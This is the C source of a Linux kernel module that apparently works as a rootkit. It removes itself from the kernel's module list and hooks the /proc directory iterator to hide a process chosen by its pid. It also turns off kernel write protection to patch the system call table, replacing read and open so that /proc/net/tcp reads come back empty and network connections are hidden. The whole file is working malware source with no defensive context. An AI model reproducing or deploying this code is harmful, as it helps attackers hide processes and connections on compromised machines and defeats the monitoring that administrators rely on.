#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>

#include <linux/proc_fs.h>
#include <linux/unistd.h>


static long unsigned sys_call_table_location;
static char* pid;

module_param(sys_call_table_location, ulong, S_IRUGO);
module_param(pid, charp, S_IRUGO);

static char lastPath[1000];
static char* targetPath = "/proc/net/tcp";
unsigned long *sys_call_table;
//------------------------------------
static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
        loff_t off, u64 ino, unsigned int d_type)
{
    if (strncmp(proc_name, pid, strlen(pid)) == 0)
        return 0;

    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}
//-----------------------------------------
asmlinkage ssize_t (*original_read) (int, void* , size_t);

asmlinkage ssize_t my_read(int fd, void *buf, size_t count){
  // printk("before %s\n", buf);
  ssize_t out = original_read(fd, buf, count);
  // printk("after %s\n", buf);
  if(strncmp(lastPath,targetPath,strlen(lastPath))==0){
  //   char* lines = (char*)buf;
    // int line_index = get_line_index(lines);
    // buf = remove_line(lines,line_index);
    // printk("Hello\n");
    // buf = "hey";
    // printk("after %s\n", buf);
    return 0;
  }
  return out;
}

asmlinkage int (*original_open) (const char*, int, mode_t);

asmlinkage int my_open(const char* pathname, int flags, mode_t mode){
  long c = original_open(pathname , flags , mode);
  // printk("evil open\n");
  strcpy(lastPath,pathname);
  // printk("%s\n", lastPath);
  return c;
}

static int init(void)
{
    list_del (& THIS_MODULE ->list);
    if(kern_path("/proc", 0, &p))
        return 0;

    /* get the inode*/
    proc_inode = p.dentry->d_inode;
    /* get a copy of file_operations from inode */
    proc_fops = *proc_inode->i_fop;
    /* backup the file_operations */
    backup_proc_fops = proc_inode->i_fop;
    /* modify the copy with out evil function */
    proc_fops.iterate = rk_iterate;
    /* overwrite the active file_operations */
    proc_inode->i_fop = &proc_fops;
    //----------------------------------
    sys_call_table = (unsigned long *)sys_call_table_location;
    write_cr0 (read_cr0 () & (~ 0x10000));
    original_read = sys_call_table[__NR_read];
    sys_call_table[__NR_read] = my_read;
    original_open = sys_call_table[__NR_open];
    sys_call_table[__NR_open] = my_open;
    write_cr0 (read_cr0 () | 0x10000);
    printk("initiated\n");
    return 0;
}

static void clean(void)
{
    if(kern_path("/proc", 0, &p))
        return;
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fops;
    //---------------------------------------
    write_cr0 (read_cr0 () & (~ 0x10000));
    sys_call_table[__NR_read] = original_read;
    sys_call_table[__NR_open] = original_open;
    write_cr0 (read_cr0 () | 0x10000);
    printk("cleaned\n");
}

module_init(init);
module_exit(clean);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("nisay");
MODULE_VERSION("0.1");
